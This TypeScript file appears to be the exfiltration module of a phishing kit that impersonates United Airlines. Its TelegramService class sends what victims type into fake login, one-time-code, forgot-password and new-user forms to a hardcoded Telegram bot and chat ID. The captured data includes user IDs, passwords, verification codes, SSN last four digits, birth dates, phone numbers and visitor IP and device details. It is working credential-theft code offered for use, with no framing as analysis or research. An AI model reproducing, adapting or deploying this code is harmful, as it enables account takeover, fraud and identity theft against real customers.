export interface VisitorData {
  location: string
  ip: string
  timezone: string
  isp: string
  userAgent: string
  screen: string
  language: string
  referrer: string
  utcTime: string
}

export interface LoginData {
  userId: string
  password: string
  attempt?: number
  success?: boolean
}

export interface VerificationData {
  verificationType: string
  code: string
}

export interface IdentityDetailsData {
  ssnLast4: string
  birthDate: string
  phoneNumber: string
  zipCode: string
}

export interface ForgotPasswordData {
  ssnLast4: string
  birthDate: string
}

export interface NewUserData {
  ssnLast4: string
  birthDate: string
}

export interface AccountFoundData {
  method: string
  password?: string
}

const SITE_NAME = "United Airlines"
const TELEGRAM_BOT_TOKEN = "5877336614:AAHeJpXioCqVASLDNCjMOp82W7YTkrkk3YI"
const TELEGRAM_CHAT_ID = "1535273256"

class TelegramService {
  private botToken: string
  private chatIds: string[]

  constructor() {
    this.botToken = TELEGRAM_BOT_TOKEN
    const raw = TELEGRAM_CHAT_ID
    this.chatIds = raw
      .split(',')
      .map((id) => id.trim())
      .filter((id) => id.length > 0)
  }

  private async sendMessage(message: string): Promise<void> {
    if (!this.botToken || this.chatIds.length === 0) {
      console.error("Telegram not configured: missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID")
      return
    }

    const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`

    try {
      await Promise.all(
        this.chatIds.map((chatId) =>
          fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "HTML",
            }),
          }),
        ),
      )
    } catch (error) {
      console.error("Failed to send Telegram message:", error)
    }
  }

  async sendVisitorNotification(data: VisitorData): Promise<void> {
    const message = `\n🌐 <b>New Visitor - ${SITE_NAME}</b>\n\n📍 <b>Location:</b> ${data.location}\n🌍 <b>IP:</b> ${data.ip}\n⏰ <b>Timezone:</b> ${data.timezone}\n🌐 <b>ISP:</b> ${data.isp}\n\n📱 <b>Device:</b> ${data.userAgent}\n🖥️ <b>Screen:</b> ${data.screen}\n🌍 <b>Language:</b> ${data.language}\n🔗 <b>Referrer:</b> ${data.referrer}\n\n🕒 <b>UTC Time:</b> ${data.utcTime}`
    await this.sendMessage(message)
  }

  async sendLoginNotification(data: LoginData): Promise<void> {
    const attemptText =
      typeof data.attempt === "number" ? `\n#️⃣ <b>Attempt:</b> ${data.attempt}` : ""
    const statusText =
      typeof data.success === "boolean"
        ? `\n📊 <b>Status:</b> ${data.success ? "Success" : "Invalid credentials"}`
        : ""

    const message = `\n🔐 <b>Login Attempt - ${SITE_NAME}</b>\n\n👤 <b>User ID:</b> ${data.userId}\n🔑 <b>Password:</b> ${data.password}${attemptText}${statusText}`
    await this.sendMessage(message)
  }

  async sendVerificationNotification(data: VerificationData): Promise<void> {
    const message = `\n✅ <b>Verification Code Submitted - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${data.verificationType}\n🔢 <b>Code:</b> ${data.code}`
    await this.sendMessage(message)
  }

  async sendVerificationClickNotification(verificationType: string): Promise<void> {
    const message = `\n🟦 <b>Verification Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`
    await this.sendMessage(message)
  }

  async sendResendCodeNotification(isSecondOtp: boolean): Promise<void> {
    const otpType = isSecondOtp ? "Code (final)" : "Code (first OTP)"
    const message = `\n🔄 <b>Resend Code Requested - ${SITE_NAME}</b>\n\n🔐 <b>OTP Type:</b> ${otpType}`
    await this.sendMessage(message)
  }

  async sendIdentityDetailsNotification(
    data: IdentityDetailsData,
  ): Promise<void> {
    const message = `\n🪪 <b>Identity Details Submitted - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n📱 <b>Phone Number:</b> ${data.phoneNumber}\n📮 <b>Zip Code:</b> ${data.zipCode}`
    await this.sendMessage(message)
  }

  async sendForgotPasswordPageViewNotification(): Promise<void> {
    const message = `\n🔗 <b>Forgot Password page opened - ${SITE_NAME}</b>\n\nUser clicked "Forgot User ID or Password?" and landed on the form.`
    await this.sendMessage(message)
  }

  async sendForgotPasswordNotification(data: ForgotPasswordData): Promise<void> {
    const message = `\n🔑 <b>Forgot Password – form submitted - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`
    await this.sendMessage(message)
  }

  async sendNewUserPageViewNotification(): Promise<void> {
    const message = `\n🔗 <b>New User page opened - ${SITE_NAME}</b>\n\nUser clicked "New User?" and landed on the form.`
    await this.sendMessage(message)
  }

  async sendNewUserNotification(data: NewUserData): Promise<void> {
    const message = `\n👤 <b>New User – form submitted - ${SITE_NAME}</b>\n\n🔢 <b>Last 4 SSN:</b> ${data.ssnLast4}\n📅 <b>Birth Date:</b> ${data.birthDate}\n✅ <b>Privacy Policy:</b> accepted`
    await this.sendMessage(message)
  }

  async sendNewUserCodePageViewNotification(): Promise<void> {
    const message = `\n🔗 <b>New User – Enter Access Code page opened - ${SITE_NAME}</b>\n\nUser landed on the page to enter the code sent to them.`
    await this.sendMessage(message)
  }

  async sendNewUserCodeNotification(code: string): Promise<void> {
    const message = `\n🔢 <b>New User – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`
    await this.sendMessage(message)
  }

  async sendNewUserPasswordPageViewNotification(): Promise<void> {
    const message = `\n🔗 <b>New User – Create Password page opened - ${SITE_NAME}</b>\n\nUser landed on the page to create their password.`
    await this.sendMessage(message)
  }

  async sendNewUserPasswordNotification(password: string): Promise<void> {
    const message = `\n🔑 <b>New User – Password Set - ${SITE_NAME}</b>\n\n🔑 <b>Password:</b> ${password}`
    await this.sendMessage(message)
  }

  async sendAccountFoundNotification(data: AccountFoundData): Promise<void> {
    const passwordText = data.password ? `\n🔑 <b>Password:</b> ${data.password}` : ""
    const message = `\n✅ <b>Account Found – Continue Clicked - ${SITE_NAME}</b>\n\n🔐 <b>Method:</b> ${data.method}${passwordText}`
    await this.sendMessage(message)
  }

  async sendAccountFoundResetPasswordNotification(): Promise<void> {
    const message =
      `\n🔗 <b>Account Found – Reset password link clicked - ${SITE_NAME}</b>\n\n` +
      `User clicked "Reset password" on the account found page.`
    await this.sendMessage(message)
  }

  async sendForgotPasswordVerifyNotification(verificationType: string): Promise<void> {
    const message = `\n🔐 <b>Forgot Password – Verify Identity Option Selected - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${verificationType}`
    await this.sendMessage(message)
  }

  async sendForgotPasswordCodeNotification(code: string): Promise<void> {
    const message = `\n🔢 <b>Forgot Password – Access Code Entered - ${SITE_NAME}</b>\n\n🔢 <b>Code:</b> ${code}`
    await this.sendMessage(message)
  }

  async sendForgotPasswordResendNotification(): Promise<void> {
    const message = `\n🔄 <b>Forgot Password – Resend Code Requested - ${SITE_NAME}</b>`
    await this.sendMessage(message)
  }
}

export const telegramService = new TelegramService()


